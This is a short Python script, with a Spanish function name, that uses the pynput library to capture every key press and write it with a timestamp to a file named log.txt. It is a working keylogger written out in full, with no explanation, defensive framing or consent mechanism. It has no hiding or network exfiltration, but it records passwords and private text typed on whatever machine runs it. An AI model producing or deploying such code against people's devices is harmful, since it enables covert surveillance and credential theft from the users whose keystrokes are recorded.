from pynput.keyboard import Key, Listener
import logging



logging.basicConfig(filename = "log.txt", level = logging.DEBUG, format = "%(asctime)s - %(message)s")

def presionar(key):
    logging.info(str(key))

with Listener(on_press=presionar) as listener:
    listener.join()
    

    
 

